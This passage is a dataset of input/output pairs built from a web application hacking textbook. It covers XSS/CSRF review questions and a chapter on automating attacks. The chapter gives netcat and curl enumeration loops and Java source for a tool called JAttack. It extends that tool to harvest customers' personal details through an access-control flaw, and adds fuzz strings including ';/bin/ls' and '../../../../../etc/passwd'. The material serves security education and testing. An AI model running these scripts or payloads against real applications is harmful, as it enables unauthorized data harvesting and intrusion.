instances of XSS vulnerabilities?\n2. You discover a reflected XSS vulnerability within the unauthenticated\narea of an application’s functionality. State two different ways in which\nthe vulnerability could be used to compromise an authenticated session\nwithin the application.\n3. You discover that the contents of a cookie parameter are copied without\nany filters or sanitization into the application’s response. Can this\nbehavior be used to inject arbitrary JavaScript into the returned page?\nCan it be exploited to perform an XSS attack against another user?\n4. You discover stored XSS behavior within data that is only ever displayed\nback to yourself. Does this behavior have any security significance?\n5. You are attacking a web mail application that handles file attachments\nand displays these in-browser. What common vulnerability should you\nimmediately check for?\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 470\n470 Chapter 12 ■ Attacking Other Users\n6. How does the browser’s same origin policy impinge upon the use of\nthe Ajax technology XMLHttpRequest?\n7. Name three possible attack payloads for XSS exploits (that is, the mali-\ncious actions that you can perform within another user’s browser, not\nthe methods by which you deliver the attacks).\n8. You discover a function which copies the value of some user-supplied\ndata into the target of an image tag:\n<img src=”userdata”>\nThe data is stored within the application and will be returned to other\nauthenticated users who view the relevant page. The application is\nHTML-encoding the <and >characters, preventing you from breaking\nout of the image tag. What two categories of attack can you perform?\n9. You have discovered a reflected XSS vulnerability where you can inject\narbitrary data into a single location within the HTML of the returned\npage. The data inserted is truncated to 50 bytes, but you want to inject a\nlengthy script. You prefer not to call out to a script on an external\nserver. How can you work around the length limit?\n10. You discover a reflected XSS flaw in a request that must use the POST\nmethod. What delivery mechanisms are feasible for performing an attack?\n11. How can an attacker make use of the TRACEmethod to facilitate an XSS\nattack?\n12. You discover an application function where the contents of a query\nstring parameter are inserted into the Locationheader in an HTTP redi-\nrect. What three different types of attacks can this behavior potentially\nbe exploited to perform?\n13. Your very first request to a banking application returns HTML like the\nfollowing:\n<frameset>\n<frame src=”top.asp” name=”top_nav”>\n<frame src=”left.asp” name=”left_nav”>\n<frame src=”main.asp” name=”main”>\n</frameset>\nWhat vulnerability can you immediately diagnose here, without per-\nforming any further testing?\n14. What is the main precondition that must exist to enable an XSRF attack\nagainst a sensitive function of an application?\n15. What three defensive measures can each be used to prevent JSON\nhijacking attacks?"
  },
  {
    "input": "Chapter 13: Automating Bespoke Attacks",
    "output": "70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 471\nCHAPTER\n13\nAutomating Bespoke Attacks\nThis chapter does not introduce any new categories of vulnerability. Rather,\nwe will be examining one key element in an effective methodology for hacking\nweb applications— that is, the use of automation to strengthen and accelerate\nbespoke attacks. The range of techniques involved can be applied throughout\nthe application and to every stage of the attack process, from initial mapping\nto actual exploitation.\nEvery web application is different. Attacking an application effectively\ninvolves using various manual procedures and techniques to understand its\nbehavior and probe for vulnerabilities. It also entails bringing to bear your\nexperience and intuition in an imaginative way. Attacks are typically bespoke,\nor custom-made, in nature, tailored to the particular behavior you have iden-\ntified, and the specific ways in which the application enables you to interact\nwith and manipulate it. Performing bespoke attacks manually can be\nextremely laborious and is prone to mistakes. The most successful web appli-\ncation hackers take their bespoke attacks a step further, and find ways of\nautomating these to make them easier, faster, and more effective.\nIn this chapter, we will describe a proven methodology for automating\nbespoke attacks. This methodology combines the virtues of human intelli-\ngence and computerized brute force, usually with devastating results.\n471"
  },
  {
    "input": "Uses for Bespoke Automation",
    "output": "70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 472\n472 Chapter 13 ■ Automating Bespoke Attacks\nUses for Bespoke Automation\nThere are three main situations in which bespoke automated techniques can be\nemployed to assist you in attacking a web application:\n■■ Enumerating identifiers — Most applications use various kinds of\nnames and identifiers to refer to individual items of data and resources,\nsuch as account numbers, usernames, and document IDs. It is fre-\nquently the case that you need to iterate through a very large number of\npotential identifiers, to enumerate which ones are valid or worthy of\nfurther investigation. In this situation, you can use automation in a\nfully bespoke way to work through a list of possible identifiers or cycle\nthrough the syntactic range of identifiers believed to be in use by the\napplication.\nAn example of an attack to enumerate identifiers would be where an\napplication uses a page number parameter to retrieve specific content:\nhttps://wahh-app.com/app/showPage.jsp?PageNo=244197\nIn the course of browsing through the application, you discover a large\nnumber of valid PageNovalues, but to identify every valid value you\nneed to cycle through the entire range—something you cannot feasibly\ndo manually.\n■■ Harvesting data — There are many kinds of web application vulnera-\nbilities that enable you to extract useful or sensitive data from the appli-\ncation using specific crafted requests. For example, a personal profile\npage may display the personal and banking details of the current user\nand indicate that user’s privilege level within the application. Through\nan access control defect, you may be able to view the personal profile\npage of any application user—but only one user at a time. To harvest\nthis data for every user might require thousands of individual requests.\nRather than working manually, you can use a bespoke automated\nattack to quickly capture all of this data in a useful form.\nAn example of harvesting useful data would be to extend the enumera-\ntion attack described previously. Instead of simply confirming which\nPageNovalues are valid, your automated attack could extract the con-\ntents of the HTML title tag from each page it retrieves, enabling you to\nquickly scan the list of pages for those that are most interesting.\n■■ Web application fuzzing — In describing the practical steps for detect-\ning common web application vulnerabilities, we have seen numerous\nexamples where the best approach to detection is to submit various\nunexpected items of data and attack strings, and review the applica-"
  },
  {
    "input": "Enumerating Valid Identifiers",
    "output": "70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 473\nChapter 13 ■ Automating Bespoke Attacks 473\ntion’s responses for any anomalies that indicate that the flaw may be\npresent. In a large application, your initial mapping exercises may iden-\ntify dozens of distinct requests which you need to probe, each contain-\ning numerous different parameters. To test each case manually is\ntime-consuming and mind-numbing, and liable to leave a large part of\nthe attack surface neglected. Using bespoke automation, however, you\ncan very quickly generate huge numbers of requests containing com-\nmon attack strings, and quickly assess the server’s responses to home in\non interesting cases that merit further investigation. This technique is\noften referred to as fuzzing.\nWe will examine in detail each of these three situations, and the ways in\nwhich bespoke automated techniques can be leveraged to vastly enhance your\nattacks against an application.\nEnumerating Valid Identifiers\nIn the course of describing various common vulnerabilities and attack tech-\nniques, we have encountered numerous situations in which the application\nemploys a name or identifier for some item, and your task as an attacker is to\ndiscover some or all of the valid identifiers in use. Some examples of where\nthis requirement can arise are:\n■■ The application’s login function returns informative messages that dis-\nclose whether a failed login was the result of an unrecognized user-\nname or incorrect password. By iterating through a list of common\nusernames and attempting to log in using each one, you can narrow the\nlist down to those that you know to be valid. This list can then be used\nas the basis for a password guessing attack.\n■■ Many applications use identifiers to refer to individual resources that\nare processed within the application, such as document IDs, account\nnumbers, employee numbers, and log entries. Often, the application\nwill expose some means of confirming whether a specific identifier is\nvalid. By iterating through the syntactic range of identifiers in use, you\ncan obtain a comprehensive list of all these resources.\n■■ If the session tokens generated by the application can be predicted, you\nmay be able to hijack other users’ sessions simply by extrapolating from\na series of tokens issued to you. Depending on the reliability of this\nprocess, you may need to test a large number of candidate tokens for\neach valid value that is confirmed.\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 474\n474 Chapter 13 ■ Automating Bespoke Attacks\nThe Basic Approach\nYour first task in formulating a bespoke automated attack to enumerate valid\nidentifiers is to locate a request/response pair which has the following charac-\nteristics:\n■■ The request includes a parameter containing the identifier that you are\ntargeting. For example, in a function that displays a stored document,\nthe request might contain the parameter docID=3801.\n■■ The server’s response to this request varies in a systematic way\nwhen you vary the parameter’s value. For example, if a valid docIdis\nrequested, the server might return a long response containing the speci-\nfied document’s contents. If an invalid value is requested, it might\nreturn a short response containing the string Invalid document ID.\nHaving located a suitable request/response pair, the basic approach\ninvolves submitting a large number of automated requests to the application,\neither working through a list of potential identifiers, or iterating through the\nsyntactic range of identifiers known to be in use. The application’s responses\nto these requests are monitored for “hits,” indicating that a valid identifier was\nsubmitted.\nDetecting Hits\nThere are numerous attributes of responses in which systematic variations\nmay be detected, and which may therefore provide the basis for an automated\nattack.\nHTTP Status Code\nMany applications return different status codes in a systematic way depend-\ning on the values of submitted parameters. The values that are most com-\nmonly encountered during an attack to enumerate identifiers are:\n■■ 200– The default response code, meaning “ok.”\n■■ 301 or 302– A redirection to a different URL.\n■■ 401 or 403– The request was not authorized or allowed.\n■■ 404– The requested resource was not found.\n■■ 500– The server encountered an error when processing the request.\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 475\nChapter 13 ■ Automating Bespoke Attacks 475\nResponse Length\nIt is common for dynamic application pages to construct responses using a\npage template (which has a fixed length), and insert per-response content into\nthis template. If the per-response content does not exist or is invalid (e.g., an\nincorrect document ID was requested), the application might simply return an\nempty template. In this situation, the response length is a reliable indicator of\nwhether a valid document ID has been identified.\nIn other situations, different response lengths may point towards the occur-\nrence of an error or the existence of additional functionality. In the authors’\nexperience, the HTTP status code and response length indicators have been\nfound to provide a highly reliable means of identifying anomalous responses\nin the majority of cases.\nResponse Body\nIt is very common for the data actually returned by the application to contain\nliteral strings or patterns that can be used to detect hits. For example, when an\ninvalid document ID is requested, the response might contain the string\nInvalid document ID. In some cases, where the HTTP response code does not\nvary, and the overall response length is changeable due to the inclusion of\ndynamic content, searching responses for a specific string or pattern may be\nthe most reliable means of identifying hits.\nLocation Header\nIn some cases, the application will respond to every request for a particular\nURL with an HTTP redirect (a 302 status code), where the target of the redirec-\ntion depends upon the parameters submitted in the request. For example, a\nrequest to view a report might result in a redirect to /download.jspif the sup-\nplied report name is correct, or to /error.jspif it is incorrect. The target of an\nHTTP redirect is specified in the Locationheader, and can often be used as a\nway of identifying hits.\nSet-Cookie Header\nOccasionally, the application may respond in an identical way to any set of\nparameters, with the exception that a cookie is set in certain cases. For exam-\nple, every login request might be met with the same redirect, but in the case of\nvalid credentials, the application sets a cookie containing a session token. The\ncontent that the client receives when it follows the redirect will depend on\nwhether a valid session token is submitted.\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 476\n476 Chapter 13 ■ Automating Bespoke Attacks\nTime Delays\nOccasionally, the actual contents of the server’s response may be identical\nwhen valid and invalid parameters are submitted, but the time taken to return\nthe response may differ subtly. For example, when an invalid username is sub-\nmitted to a login function, the application may respond immediately with a\ngeneric, uninformative message. However, when a valid username is submit-\nted, the application may perform various back-end processing to validate the\nsupplied credentials, some of which is computationally intensive, before\nreturning the same message if the credentials are incorrect. If you can detect\nthis time difference remotely, then it can be used as a discriminator to identify\nhits in your attack. (This bug is also often found in other types of software,\nsuch as older versions of OpenSSH.)\nTIP The primary objective in selecting indicators of hits is to find one that is\ncompletely reliable or a group that are reliable when taken together. However,\nin some attacks, you may not know in advance exactly what a hit looks like. For\nexample, when targeting a login function to try and enumerate usernames, you\nmay not actually possess a known valid username in order to determine the\napplication’s behavior in the case of a hit. In this situation, the best approach is\nto monitor the application’s responses for all of the attributes just described\nand to look for any anomalies in these.\nScripting the Attack\nLet’s suppose that we have identified the following URL, which returns a 200\nresponse code when a valid docIDvalue is submitted, and a 500 response code\notherwise:\nhttp://wahh-app.com/ShowDoc.jsp?docID=3801\nThis request/response pair satisfies the two conditions required for you to\nbe able to mount an automated attack to enumerate valid document IDs.\nIn a simple case such as this, it is possible to create a custom script very\nquickly to perform an automated attack. For example, the following bash\nscript reads a list of potential document IDs from stdin, uses the netcattool\nto request a URL containing each ID, and logs the first line of the server’s\nresponse, which contains the HTTP status code:\n#!/bin/bash\nserver=wahh-app.com\nport=80\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 477\nChapter 13 ■ Automating Bespoke Attacks 477\nwhile read id\ndo\necho -ne “$id\\t”\necho -ne “GET /ShowDoc.jsp?docID=$id HTTP/1.0\\r\\nHost: $server\\r\\n\\r\\n”\n| netcat $server $port | head -1\ndone | tee outputfile\nRunning this script with a suitable input file generates the following output,\nwhich enables you to quickly identify valid document IDs:\n~> ./script <IDs.txt\n3000 HTTP/1.0 500 Internal Server Error\n3001 HTTP/1.0 200 Ok\n3002 HTTP/1.0 200 Ok\n3003 HTTP/1.0 500 Internal Server Error\n...\nTIP The Cygwin environment can be used to execute bash scripts on the\nWindows platform. Also, the UnxUtils suite contains Win32 ports of numerous\nuseful GNU utilities such as headand grep.\nYou can achieve the same result just as easily in a Windows batch script. The\nfollowing example uses the curl tool to generate requests and the findstr\ncommand to filter the output:\nfor /f “tokens=1” %i in (IDs.txt) do echo %i && curl\nwahh-app.com/ShowDoc.jsp?docId=%i -i -s | findstr /B HTTP/1.0\nWhile simple scripts like these are ideal for performing a straightforward\ntask like cycling through a list of parameter values and parsing the server’s\nresponse for a single attribute, in many situations you are likely to require\nmore power and flexibility than command-line scripting can readily offer. The\nauthors’ preference is to use a suitable high-level object-orientated language\nthat enables easy manipulation of string-based data and provides accessible\nAPIs for using sockets and SSL. Languages that satisfy these criteria include\nJava, C#, and Python. We will look in more depth at an example using Java.\nJAttack\nJAttack is a simple but versatile tool that demonstrates how anyone with some\nbasic programming knowledge can use bespoke automation to deliver very\npowerful attacks against an application. The full source code for this tool can\nbe downloaded from the companion web site (www.wiley.com/go/webhacker)\nto this book. More important than the actual code, however, are the basic tech-\nniques involved, which we will explain shortly.\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 478\n478 Chapter 13 ■ Automating Bespoke Attacks\nRather than just working with a request as an unstructured block of text, we\nneed the tool to understand the concept of a request parameter—that is, a\nnamed item of data that can be manipulated and is attached to a request in a\nparticular way. Request parameters may appear in the URL query string,\nHTTP cookies, or the body of a POST request. Let’s start by creating a Param\nclass to hold the relevant details:\n// JAttack.java\n// by Dafydd Stuttard\nimport java.net.*;\nimport java.io.*;\nclass Param\n{\nString name, value;\nType type;\nboolean attack;\nParam(String name, String value, Type type, boolean attack)\n{\nthis.name = name;\nthis.value = value;\nthis.type = type;\nthis.attack = attack;\n}\nenum Type\n{\nURL, COOKIE, BODY\n}\n}\nIn many situations, a request will contain parameters that we do not wish to\nmodify in a given attack, but that we still need to include for the attack to suc-\nceed. We can use the “attack” field to flag whether a given parameter is being\nsubjected to modification in the current attack.\nIn order to modify the value of a selected parameter in crafted ways, we\nneed our tool to understand the concept of an attack payload. In different\ntypes of attack, we will need to create different payload sources. Let’s build\nsome flexibility into the tool up front, and create an interface that all payload\nsources must implement:\ninterface PayloadSource\n{\nboolean nextPayload();\nvoid reset();\nString getPayload();\n}\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 479\nChapter 13 ■ Automating Bespoke Attacks 479\nThe nextPayloadmethod can be used to advance the state of the source, and\nreturns true until all of its payloads are used up. The reset method returns\nthe state to its initial point. The getPayload method returns the value of the\ncurrent payload.\nIn the document enumeration example, the parameter we want to vary con-\ntains a numeric value, and so our first implementation of the PayloadSource\ninterface is a class to generate numeric payloads. This class allows us to spec-\nify the range of numbers which we want to test:\nclass PSNumbers implements PayloadSource\n{\nint from, to, step, current;\nPSNumbers(int from, int to, int step)\n{\nthis.from = from;\nthis.to = to;\nthis.step = step;\nreset();\n}\npublic boolean nextPayload()\n{\ncurrent += step;\nreturn current <= to;\n}\npublic void reset()\n{\ncurrent = from - step;\n}\npublic String getPayload()\n{\nreturn Integer.toString(current);\n}\n}\nEquipped with the concept of a request parameter and a payload source, we\nhave sufficient resources to generate actual requests and process the server’s\nresponses. First, let’s specify some configuration for our first attack:\nclass JAttack\n{\n// attack config\nString host = “wahh-app.com”;\nint port = 80;\nString method = “GET”;\nString url = “/ShowDoc.jsp”;\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 480\n480 Chapter 13 ■ Automating Bespoke Attacks\nParam[] params = new Param[]\n{\nnew Param(“DocID”, “3801”, Param.Type.URL, true),\n};\nPayloadSource payloads = new PSNumbers(3000, 3100, 1);\nThis configuration includes the basic target information, creates a single\nrequest parameter called DocID, and configures our numeric payload source to\ncycle through the range 3000–3100.\nIn order to cycle through a series of requests, potentially targeting multiple\nparameters, we’ll need to maintain some state. Let’s use a simple nextRequest\nmethod to advance the state of our request engine, returning trueuntil there\nare no more requests remaining:\n// attack state\nint currentParam = 0;\nboolean nextRequest()\n{\nif (currentParam >= params.length)\nreturn false;\nif (!params[currentParam].attack)\n{\ncurrentParam++;\nreturn nextRequest();\n}\nif (!payloads.nextPayload())\n{\npayloads.reset();\ncurrentParam++;\nreturn nextRequest();\n}\nreturn true;\n}\nThis stateful request engine will keep track of which parameter we are cur-\nrently targeting, and which attack payload to place into it. The next step is to\nactually build a complete HTTP request using this information. This involves\ninserting each type of parameter into the correct place in the request, and\nadding any other required headers:\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 481\nChapter 13 ■ Automating Bespoke Attacks 481\nString buildRequest()\n{\n// build parameters\nStringBuffer urlParams = new StringBuffer();\nStringBuffer cookieParams = new StringBuffer();\nStringBuffer bodyParams = new StringBuffer();\nfor (int i = 0; i < params.length; i++)\n{\nString value = (i == currentParam) ?\npayloads.getPayload() :\nparams[i].value;\nif (params[i].type == Param.Type.URL)\nurlParams.append(params[i].name + “=” + value + “&“);\nelse if (params[i].type == Param.Type.COOKIE)\ncookieParams.append(params[i].name + “=” + value + “; “);\nelse if (params[i].type == Param.Type.BODY)\nbodyParams.append(params[i].name + “=” + value + “&“);\n}\n// build request\nStringBuffer req = new StringBuffer();\nreq.append(method + “ “ + url);\nif (urlParams.length() > 0)\nreq.append(“?” + urlParams.substring(0, urlParams.length() - 1));\nreq.append(“ HTTP/1.0\\r\\nHost: “ + host);\nif (cookieParams.length() > 0)\nreq.append(“\\r\\nCookie: “ + cookieParams.toString());\nif (bodyParams.length() > 0)\n{\nreq.append(“\\r\\nContent-Type: application/x-www-form-urlencoded”);\nreq.append(“\\r\\nContent-Length: “ + (bodyParams.length() - 1));\nreq.append(“\\r\\n\\r\\n”);\nreq.append(bodyParams.substring(0, bodyParams.length() - 1));\n}\nelse req.append(“\\r\\n\\r\\n”);\nreturn req.toString();\n}\nNOTE If you write your own code to generate POSTrequests, you will need to\ninclude a valid Content-Lengthheader that specifies the actual length of the\nHTTP body in each request, as in the preceding code. If an invalid Content-\nLengthis submitted, most web servers will either truncate the data you submit\nor wait indefinitely for more data to be supplied.\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 482\n482 Chapter 13 ■ Automating Bespoke Attacks\nIn order to send our requests, we need to open network connections to the\ntarget web server. Java makes the task of opening a TCP connection, submit-\nting data, and reading the server’s response extremely easy:\nString issueRequest(String req) throws UnknownHostException, IOException\n{\nSocket socket = new Socket(host, port);\nOutputStream os = socket.getOutputStream();\nos.write(req.getBytes());\nos.flush();\nBufferedReader br = new BufferedReader(new InputStreamReader(\nsocket.getInputStream()));\nStringBuffer response = new StringBuffer();\nString line;\nwhile (null != (line = br.readLine()))\nresponse.append(line);\nos.close();\nbr.close();\nreturn response.toString();\n}\nHaving obtained the server’s response to each request, we need to parse it\nto extract the relevant information to enable us to identify hits in our attack.\nLet’s start by simply recording two interesting items—the HTTP status code\nfrom the first line of the response and the total length of the response:\nString parseResponse(String response)\n{\nStringBuffer output = new StringBuffer();\noutput.append(response.split(“\\\\s+”, 3)[1] + “\\t”);\noutput.append(Integer.toString(response.length()) + “\\t”);\nreturn output.toString();\n}\nFinally, we now have everything in place to launch our attack. We just need\nsome simple wrapper code to call each of the precedingmethods in turn and\nprint out the results, until all our requests have been made and nextRequest\nreturns false:\nvoid doAttack()\n{\nSystem.out.println(“param\\tpayload\\tstatus\\tlength”);\nString output = null;\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 483\nChapter 13 ■ Automating Bespoke Attacks 483\nwhile (nextRequest())\n{\ntry\n{\noutput = parseResponse(issueRequest(buildRequest()));\n}\ncatch (Exception e)\n{\noutput = e.toString();\n}\nSystem.out.println(params[currentParam].name + “\\t” +\npayloads.getPayload() + “\\t” + output);\n}\n}\npublic static void main(String[] args)\n{\nnew JAttack().doAttack();\n}\n}\nThat’s it! To compile and run this code, you will need to download the Java\nSDK and JRE from Sun, and then execute the following:\n> javac JAttack.java\n> java JAttack\nIn our example configuration, the tool’s output is:\nparam payload status length\nDocID 3000 500 220\nDocID 3001 200 48179\nDocID 3002 200 62881\nDocID 3003 500 220\n...\nAssuming a normal network connection and amount of processing power,\nJAttack is capable of issuing hundreds of individual requests per minute and\noutputting the pertinent details, enabling you to very quickly identify valid\ndocument identifiers for further investigation.\nIt may appear that the attack just illustrated is no more sophisticated than\nthe original bash script example, which required only a few lines of code.\nHowever, because of the way JAttack is engineered, it is trivial to modify it to\ndeliver much more sophisticated attacks, incorporating multiple request para-\nmeters, a variety of different payload sources, and arbitrarily complex pro-\ncessing of responses. In the following sections, we will make some minor\nadditions to JAttack’s code, which make it considerably more powerful."
  },
  {
    "input": "Harvesting Useful Data",
    "output": "70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 484\n484 Chapter 13 ■ Automating Bespoke Attacks\nHarvesting Useful Data\nThe second main use of bespoke automation when attacking an application is\nto extract useful or sensitive data by using specific crafted requests to retrieve\nthe information one item at a time. This situation most commonly arises when\nyou have identified an exploitable vulnerability, such as an access control flaw,\nthat enables you to access an unauthorized resource by specifying an identifier\nfor it. However, it may also arise when the application is functioning entirely\nas intended by its designers. Here are some examples of cases where auto-\nmated data harvesting may be useful:\n■■ An online retailing application contains a facility for registered cus-\ntomers to view their pending orders. However, if you can determine the\norder numbers assigned to other customers, then you can view their\norder information in just the same way as your own.\n■■ A forgotten password function relies upon a user-configurable chal-\nlenge. You can submit an arbitrary username and view the associated\nchallenge. By iterating through a list of enumerated or guessed user-\nnames, you can obtain a large list of users’ password challenges, to\nidentify those that are easily guessable.\n■■ A workflow application contains a function to display some basic\naccount information about a given user, including her privilege level\nwithin the application. By iterating through the range of user IDs in\nuse, you can obtain a listing of all administrative users, which can be\nused as the basis for password guessing and other attacks.\nThe basic approach to using automation to harvest data is essentially simi-\nlar to the enumeration of valid identifiers, except that you are now not only\ninterested in a binary result (i.e., a hit or a miss), but are seeking to extract\nsome of the content of each response in a usable form.\nConsider the following request in an application used by an online retailer,\nwhich displays the details of a specific order, including the personal informa-\ntion of the user who made the order:\nPOST /ShowOrder.jsp HTTP/1.0\nHost: wahh-app.com\nCookie: SessionId=21298FE012EEA892981;\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 37\nOrderRef=1003073781&OrderType=retail\nAlthough this application function is accessible only by authenticated users,\nthere is an access control vulnerability, which means that any user can view the\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 485\nChapter 13 ■ Automating Bespoke Attacks 485\ndetails of any order. Further, the format used for the OrderRef parameter\nappears to be a six-digit date followed by a four-digit number. Assuming that\nthe last four digits are more-or-less sequential, it should be trivial to predict\nother users’ order numbers.\nWhen the details for an order are displayed, the page source contains the\npersonal data within an HTML table like the following:\n<tr>\n<td>Name:</td><td>Phill Bellend</td>\n</tr>\n<tr>\n<td>Address:</td><td>52, Throwley Way</td>\n</tr>\n...\nThis data could be of huge value to a competitor company or an identity\nfraudster. Given the application’s behavior, it is straightforward to mount a\nbespoke automated attack to harvest all of the personal customer information\ncontained within the application.\nTo do so, let’s make some quick enhancements to the JAttack tool, to enable\nit to extract and log specific data from within the server’s responses. First, we\ncan add to the attack configuration data a list of the strings within the source\ncode that identify the interesting content we want to extract:\nstatic final String[] extractStrings = new String[]\n{\n“<td>Name:</td><td>”,\n“<td>Address:</td><td>”\n};\nSecond, we can add the following to the parseResponse method, to search\neach response for each of the above strings and extract what comes next, up\nuntil the angle bracket that follows it:\nfor (String extract : extractStrings)\n{\nint from = response.indexOf(extract);\nif (from == -1)\ncontinue;\nfrom += extract.length();\nint to = response.indexOf(“<”, from);\nif (to == -1)\nto = response.length();\noutput.append(response.subSequence(from, to) + “\\t”);\n}\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 486\n486 Chapter 13 ■ Automating Bespoke Attacks\nThat is all we need to change within the tool’s actual code. To configure JAt-\ntack to target the actual request in which we are interested, we need to update\nits attack configuration as follows:\nString method = “POST”;\nString url = “/ShowOrder.jsp”;\nParam[] params = new Param[]\n{\nnew Param(“SessionId”, “21298FE012EEA892981”, Param.Type.COOKIE, false),\nnew Param(“OrderRef”, “1003073781”, Param.Type.BODY, true),\nnew Param(“OrderType”, “retail”, Param.Type.BODY, false),\n};\nPayloadSource payloads = new PSNumbers(1003073700, 1003073800, 1);\nThis configuration instructs JAttack to make POST requests to the relevant\nURL, containing the three required parameters. Only one of these will actually\nbe modified, using the range of potential order numbers specified.\nWhen we now run JAttack, we obtain the following output:\nOrderRef 1003073700 500 300\nOrderRef 1003073701 500 300\n...\nOrderRef 1003073773 500 300\nOrderRef 1003073774 200 27489 P Orac 13, Fairyland St\nOrderRef 1003073775 200 28991 S Hammad 1, Stews Place\nOrderRef 1003073776 200 29430 Adam Matthews Flat 12a, G Community\nOrderRef 1003073777 200 28224 Mike Kemp 6, Carshalton Rd\nOrderRef 1003073778 200 28171 Martin Murfitt Jn15, South Circular\nOrderRef 1003073779 200 27880 D Senior The Old Doss House\nOrderRef 1003073780 200 28901 Ian Peters Penthouse Suite\nOrderRef 1003073781 200 27388 Phill Bellend 52, Throwley Way\nOrderRef 1003073782 500 300\nOrderRef 1003073783 500 300\n...\nAs you can see, the attack was successful and captured the personal details\nof some customers. It appears that when an invalid order number is submit-\nted, the server encounters an error and a 500 response code is returned. It also\nappears that none of the order numbers below 1003073774 were valid. This\nsuggests that only eight orders have been placed today, and the order numbers\nwe should target are 0903073773 and below. By writing a quick custom pay-\nload source for JAttack, we could generate payloads automatically, using the\nscheme employed by the application."
  },
  {
    "input": "Fuzzing for Common Vulnerabilities",
    "output": "70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 487\nChapter 13 ■ Automating Bespoke Attacks 487\nTIP Data output in tab-delimited format can be easily loaded into\nspreadsheet software such as Excel for further manipulation or tidying up. In\nmany situations, the output from a data-harvesting exercise can be used as the\ninput for another automated attack.\nFuzzing for Common Vulnerabilities\nThe third main use of bespoke automation does not involve targeting any\nknown vulnerability to enumerate or extract information. Rather, your objec-\ntive is to probe the application with various crafted attack strings designed to\ncause anomalous behavior within the application if particular common vul-\nnerabilities are present. This type of attack is much less focused than the ones\npreviously described, for the following reasons:\n■■ It generally involves submitting the same set of attack payloads as\nevery parameter to every page of the application, regardless of the nor-\nmal function of each parameter or the type of data that the application\nexpects to receive. These payloads are sometimes referred to as fuzz\nstrings.\n■■ You do not know in advance precisely how to identify hits. Rather than\nmonitoring the application’s responses for a specific indicator of suc-\ncess, you generally need to capture as much detail as possible in a clear\nform, so that this can be easily reviewed to identify cases where your\nattack string has triggered some anomalous behavior within the appli-\ncation, which merits further investigation.\nAs you have seen when examining various common web application flaws,\nsome vulnerabilities manifest themselves in the application’s behavior in par-\nticular recognizable ways, such as a specific error message or HTTP status\ncode. These vulnerability signatures can sometimes be relied upon to detect\ncommon defects, and they are the means by which automated application vul-\nnerability scanners identify the majority of their findings (see Chapter 19).\nHowever, in principle, any test string you submit to the application may give\nrise to anyexpected behavior that, in its particular context, points towards the\npresence of a vulnerability. For this reason, an experienced attacker using\nbespoke automated techniques is usually much more effective than any fully\nautomated tool can ever be. Such an attacker can perform an intelligent analy-\nsis of every pertinent detail of the application’s responses. He can think like an\napplication designer and developer. And he can spot and investigate unusual\nconnections between requests and responses in a way that no current tool is\nable to.\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 488\n488 Chapter 13 ■ Automating Bespoke Attacks\nUsing automation to facilitate vulnerability discovery is of particular bene-\nfit in a large and complex application containing dozens of dynamic pages,\neach of which accepts numerous parameters. Testing every request manually,\nand tracking the pertinent details of the application’s responses to related\nrequests, is a near-impossible task. The only practical way to probe such an\napplication is to leverage automation to replicate many of the laborious tasks\nthat you would otherwise need to perform manually.\nConsider the following example request, which contains several parameters\nof different types:\nPOST /app/acc/login.jsp?ts=29813&_DARGS=/app/acc/login_assumed.jsp HTTP/1.1\nHost: wahh-app.com\nCookie: webabacus_id=131st22418177-1; DYN_USER_ID=100014981;\nUSER_CONFIRM=836de5f76c5ec83; ParkoSearch2007=true;\nJSESSIONID=DKBHCAOQQWHFFCKTR\nContent-Length: 160\n_dyncharset=UTF-8&_template=app/inc/templ.jsp&personalDetailsURL=..%2Facc%2\nFregister_p1.jsp&login=user@wahh-mail.com&originalRedirectFromURL=+&password=\nbestinfw\nSuppose that we wish to probe this request for common defects within the\napplication. As an initial exploration of the attack surface, we decide to submit\nthe following strings in turn within each parameter:\n■■ ‘— This will generate an error in some instances of SQL injection.\n■■ ;/bin/ls— This string will cause unexpected behavior in some cases\nof command injection.\n■■ ../../../../../etc/passwd— This string will cause a different\nresponse in some cases where a path traversal flaw exists.\n■■ xsstest— If this string is copied into the server’s response then the\napplication may be vulnerable to cross-site scripting.\nWe can extend the JAttack tool to generate these payloads by creating a new\npayload source, as follows:\nclass PSFuzzStrings implements PayloadSource\n{\nstatic final String[] fuzzStrings = new String[]\n{\n“‘“, “;/bin/ls”, “../../../../../etc/passwd”, “xsstest”\n};\nint current = -1;\npublic boolean nextPayload()\n{\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 489\nChapter 13 ■ Automating Bespoke Attacks 489\ncurrent++;\nreturn current < fuzzStrings.length;\n}\npublic void reset()\n{\ncurrent = -1;\n}\npublic String getPayload()\n{\nreturn fuzzStrings[current];\n}\n}\nNOTE Any serious attack to probe the application for security flaws would\nneed to employ many other attack strings, to identify other weaknesses and\nalso other variations on the defects previously mentioned. See Chapter 20 for a\nmore comprehensive list of the strings that are effective when fuzzing a web\napplication.\nTo use JAttack for fuzzing, we also need to extend its response analysis\ncode, to provide more information about each response received from the\napplication. A simple way to greatly enhance this analysis is to search each\nresponse for a number of common strings and error messages that may indi-\ncate that some anomalous behavior has occurred, and record any appearance\nwithin the tool’s output.\nFirst, we can add to the attack configuration data a list of the strings that we\nwant to search for:\nstatic final String[] grepStrings = new String[]\n{\n“error”, “exception”, “illegal”, “invalid”, “not found”, “xsstest”\n};\nSecond, we can add the following to the parseResponse method, to search\neach response for the preceding strings and log any that are found:\nfor (String grep : grepStrings)\nif (response.indexOf(grep) != -1)\noutput.append(grep + “\\t”);\nTIP Incorporating this search functionality into JAttack will frequently prove\nuseful when enumerating identifiers within the application. It is very common to\nfind that the most reliable indicator of a 